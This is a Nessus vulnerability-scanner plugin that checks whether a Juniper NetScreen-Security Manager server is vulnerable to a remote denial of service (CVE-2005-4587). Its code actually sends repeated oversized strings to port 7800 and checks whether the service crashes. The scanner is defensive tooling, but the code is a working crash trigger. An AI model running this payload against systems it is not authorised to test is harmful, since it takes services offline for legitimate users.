#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# This script is released under the GNU GPLv2
#

if(description)
{
 script_id(20388);
 script_bugtraq_id(16075);
 script_cve_id("CVE-2005-4587");
 if ( defined_func("script_xref") ) script_xref(name:"OSVDB", value:"22047");

 name["english"] = "Juniper NetScreen-Security Manager Remote DoS flaw";

 script_name(english:name["english"]);
 script_version ("$Revision: 1.2 $");
 
 desc["english"] = "
Synopsis :

The remote server is affected by a remote denial of service flaw. 

Description :

The version of Juniper NetScreen-Security Manager (NSM) installed on
the remote host may allow an attacker to deny service to legitimate
users using specially-crafted long strings to the guiSrv and devSrv
processes.  A watchdog service included in Juniper NSM, though,
automatically restarts the application. 

By repeatedly sending a malformed request, an attacker may permanently
deny access to legitimate users.

See also :

http://archives.neohapsis.com/archives/fulldisclosure/2005-12/1281.html
http://www.juniper.net/customers/support/products/nsm.jsp

Solution : 

Upgrade to Juniper NSM version 2005.1

Risk factor : 

Low / CVSS Base Score : 3.3
(AV:R/AC:L/Au:NR/C:N/I:N/A:C/B:N)";


 script_description(english:desc["english"]);
 
 summary["english"] = "Determines if Juniper NSM guiSrv is vulnerable to remote DoS";

 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 script_family(english:"Denial of Service");
 
 script_copyright(english:"This script is Copyright (C) 2006 David Maciejak");
  
 script_require_ports(7800, 7801);
 exit(0);
}

include("global_settings.inc");
if ( ! thorough_tests || report_paranoia < 2 ) exit(0);

port = 7800;
if ( ! port ) exit(0);
soc = open_sock_tcp(port);
if (! soc) exit(0);
nbtest=50;
cz=raw_string(0xff,0xed,0xff,0xfd,0x06);
teststr=crap(300)+'\r\n';

send(socket:soc, data:cz+'\r\n');
while(nbtest-->0)
{
  send(socket:soc, data:teststr);
  soc2 = open_sock_tcp(port);
  if (!soc2) 
  {
       security_note(port);
       exit(0);
  }
  close(soc2);
}
